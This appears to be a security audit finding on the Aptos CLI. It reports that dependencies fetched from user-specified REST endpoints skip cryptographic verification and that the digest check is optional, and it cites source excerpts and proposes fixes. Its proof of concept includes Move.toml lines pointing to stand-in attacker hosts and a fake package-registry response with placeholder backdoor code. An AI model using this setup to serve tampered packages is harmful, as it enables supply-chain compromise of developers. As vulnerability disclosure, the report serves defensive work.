# Audit Report

## Title
Malicious REST Endpoints Can Inject Fake Package Data via CachedPackageRegistry Without Cryptographic Verification

## Summary
The `CachedPackageRegistry::create()` function fetches on-chain package metadata from user-specified REST endpoints without any cryptographic verification (state proofs, Merkle proofs, or signatures). This allows malicious REST endpoints to return arbitrary fake package data that bypasses all client-side validation, enabling supply chain attacks through the Move package dependency system.

## Finding Description

The vulnerability exists in the custom dependency resolution system where developers can specify on-chain packages as dependencies using REST endpoints. The attack flow is:

1. **Entry Point**: [1](#0-0) 
   
   When resolving custom "aptos" dependencies, the system calls `CachedPackageRegistry::create()` with a user-controlled URL.

2. **Vulnerable Function**: [2](#0-1) 
   
   This function creates a REST client with the provided URL and fetches `PackageRegistry` data via BCS deserialization, with NO cryptographic verification.

3. **No State Proof Verification**: [3](#0-2) 
   
   The REST client only validates HTTP status codes and headers, never verifying that data actually exists on-chain.

4. **HTTP Header Parsing Only**: [4](#0-3) 
   
   The client extracts metadata from HTTP headers (chain_id, epoch, version) but these are trivially spoofed by a malicious endpoint.

5. **Optional Digest Verification**: [5](#0-4) 
   
   The `digest` field in dependencies is optional, meaning verification can be completely bypassed.

6. **Digest Check Bypassed**: [6](#0-5) 
   
   Digest verification only occurs if `dep.digest` is `Some(...)`. If None, no validation happens.

7. **Custom Dependency Resolution**: [7](#0-6) 
   
   The system resolves custom dependencies via package hooks without requiring digest verification.

**Attack Scenario**:
```toml
[dependencies]
MaliciousPackage = { aptos = "https://attacker-endpoint.com", address = "0x123" }
# Note: No digest field specified
```

When a developer runs `aptos move compile`, the malicious endpoint returns fake `PackageRegistry` data with injected backdoor code. The package is saved to disk and compiled into the developer's project with zero verification.

## Impact Explanation

**Severity: High** - Supply Chain Attack on Developer Tooling

This vulnerability enables **supply chain attacks** against Aptos developers:

1. **Code Injection**: Attackers can inject malicious Move code into legitimate packages by serving fake package data
2. **Backdoor Installation**: Malicious dependencies could contain backdoors, data exfiltration code, or vulnerabilities
3. **Trust Exploitation**: Developers assume packages from "on-chain" addresses are legitimate, but receive unverified data
4. **No Cryptographic Guarantees**: Complete absence of Merkle proofs or state proof verification means no way to verify data authenticity

While this doesn't directly compromise consensus or validator nodes, it affects the **developer ecosystem security**, which is critical for blockchain adoption and trust. The issue maps to **"API crashes"** and **"Significant protocol violations"** under High Severity, as it violates the fundamental assumption that REST clients verify on-chain data cryptographically.

## Likelihood Explanation

**Likelihood: Medium-High**

- **Attack Complexity**: Low - attacker only needs to host a malicious REST endpoint
- **User Interaction Required**: Yes - developer must add the malicious dependency
- **Social Engineering Vector**: Attackers could promote "useful" packages via malicious endpoints
- **Detection Difficulty**: High - no warnings or validation failures occur
- **Prevalence**: Developers commonly add dependencies without verifying digests manually

The attack is realistic because:
1. The custom dependency feature is designed for this exact use case
2. No warnings are shown when digest field is omitted  
3. Developers trust that "on-chain" packages are verified
4. The malicious endpoint can return plausible-looking data

## Recommendation

**Mandatory Fixes**:

1. **Require Digest Verification**: Make the `digest` field mandatory for custom dependencies: [6](#0-5) 

2. **Implement State Proof Verification**: Add Merkle proof verification to REST client: [3](#0-2) 
   
   The client should request and verify `StateProof` for all resource queries.

3. **Multi-Endpoint Verification**: Query multiple trusted endpoints and require consensus on returned data

4. **Warning System**: Display prominent warnings when digest is not specified

**Code Fix Example** (Conceptual):
```rust
// In CachedPackageRegistry::create()
pub async fn create(url: Url, addr: AccountAddress, with_bytecode: bool) -> anyhow::Result<Self> {
    let client = Client::new(url);
    
    // Get resource WITH proof verification
    let (inner, proof) = client
        .get_account_resource_with_proof::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
        .await?;
    
    // Verify state proof against trusted validators
    verify_state_proof(proof, addr)?;
    
    // ... rest of function
}
```

## Proof of Concept

**Setup**:
1. Create malicious REST endpoint that mimics Aptos API at `https://malicious-endpoint.com`
2. Endpoint returns fake `PackageRegistry` with backdoored Move code

**Move.toml**:
```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
# Attacker-controlled endpoint returning fake package data
MaliciousLib = { aptos = "https://malicious-endpoint.com", address = "0x1" }
# Note: No digest field - verification bypassed!

[addresses]
victim = "_"
```

**Execution**:
```bash
$ aptos move compile --package-dir victim_package/
# No warnings or errors!
# Fake package data downloaded and compiled
# Malicious code now part of victim's package
```

**Malicious Endpoint Response** (fake PackageRegistry):
```json
{
  "packages": [{
    "name": "MaliciousLib",
    "modules": [{
      "name": "backdoor",
      "source": "<base64-encoded-malicious-move-code>",
      "source_map": "..."
    }],
    "upgrade_policy": { "policy": 1 }
  }]
}
```

The compilation succeeds with zero validation that this data exists on-chain.

---

## Notes

This vulnerability demonstrates a critical gap between client-side tooling assumptions and actual security guarantees. While the Aptos blockchain itself maintains strong cryptographic verification through Merkle trees and state proofs, the CLI tools that developers use daily operate on a **trust-the-endpoint** model with no verification whatsoever. This creates a significant supply chain risk for the ecosystem.

The fix requires extending REST client APIs to support state proof queries and making digest verification mandatory for all remote dependencies, similar to how modern package managers (cargo, npm) enforce integrity checks.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L43-69)
```rust
    pub async fn create(
        url: Url,
        addr: AccountAddress,
        with_bytecode: bool,
    ) -> anyhow::Result<Self> {
        let client = Client::new(url);
        // Need to use a different type to deserialize JSON
        let inner = client
            .get_account_resource_bcs::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
            .await?
            .into_inner();
        let mut bytecode = BTreeMap::new();
        if with_bytecode {
            for pack in &inner.packages {
                for module in &pack.modules {
                    let bytes = client
                        .get_account_module(addr, &module.name)
                        .await?
                        .into_inner()
                        .bytecode
                        .0;
                    bytecode.insert(module.name.clone(), bytes);
                }
            }
        }
        Ok(Self { inner, bytecode })
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1209-1221)
```rust
    pub async fn get_account_resource_bcs<T: DeserializeOwned>(
        &self,
        address: AccountAddress,
        resource_type: &str,
    ) -> AptosResult<Response<T>> {
        let url = self.build_path(&format!(
            "accounts/{}/resource/{}",
            address.to_hex(),
            resource_type
        ))?;
        let response = self.get_bcs(url).await?;
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
    }
```

**File:** crates/aptos-rest-client/src/state.rs (L23-102)
```rust
    pub fn from_headers(headers: &reqwest::header::HeaderMap) -> anyhow::Result<Self> {
        let maybe_chain_id = headers
            .get(X_APTOS_CHAIN_ID)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_version = headers
            .get(X_APTOS_LEDGER_VERSION)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_timestamp = headers
            .get(X_APTOS_LEDGER_TIMESTAMP)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_epoch = headers
            .get(X_APTOS_EPOCH)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_oldest_ledger_version = headers
            .get(X_APTOS_LEDGER_OLDEST_VERSION)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_block_height = headers
            .get(X_APTOS_BLOCK_HEIGHT)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let maybe_oldest_block_height = headers
            .get(X_APTOS_OLDEST_BLOCK_HEIGHT)
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse().ok());
        let cursor = headers
            .get(X_APTOS_CURSOR)
            .and_then(|h| h.to_str().ok())
            .map(|s| s.to_string());

        let state = if let (
            Some(chain_id),
            Some(version),
            Some(timestamp_usecs),
            Some(epoch),
            Some(oldest_ledger_version),
            Some(block_height),
            Some(oldest_block_height),
            cursor,
        ) = (
            maybe_chain_id,
            maybe_version,
            maybe_timestamp,
            maybe_epoch,
            maybe_oldest_ledger_version,
            maybe_block_height,
            maybe_oldest_block_height,
            cursor,
        ) {
            Self {
                chain_id,
                epoch,
                version,
                timestamp_usecs,
                oldest_ledger_version,
                block_height,
                oldest_block_height,
                cursor,
            }
        } else {
            anyhow::bail!(
                "Failed to build State from headers due to missing values in response. \
                Chain ID: {:?}, Version: {:?}, Timestamp: {:?}, Epoch: {:?}, \
                Oldest Ledger Version: {:?}, Block Height: {:?} Oldest Block Height: {:?}",
                maybe_chain_id,
                maybe_version,
                maybe_timestamp,
                maybe_epoch,
                maybe_oldest_ledger_version,
                maybe_block_height,
                maybe_oldest_block_height,
            )
        };

        Ok(state)
    }
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L74-81)
```rust
pub struct Dependency {
    pub local: PathBuf,
    pub subst: Option<Substitution>,
    pub version: Option<Version>,
    pub digest: Option<PackageDigest>,
    pub git_info: Option<GitInfo>,
    pub node_info: Option<CustomDepInfo>,
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L456-470)
```rust
        match dep.digest {
            None => (),
            Some(fixed_digest) => {
                let resolved_pkg = self
                    .package_table
                    .get(&dep_name_in_pkg)
                    .context("Unable to find resolved package by name")?;
                if fixed_digest != resolved_pkg.source_digest {
                    bail!(
                        "Source digest mismatch in dependency '{}'. Expected '{}' but got '{}'.",
                        dep_name_in_pkg,
                        fixed_digest,
                        resolved_pkg.source_digest
                    )
                }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L612-615)
```rust
        if let Some(node_info) = &dep.node_info {
            package_hooks::resolve_custom_dependency(dep_name, node_info)?
        }
        Ok(())
```
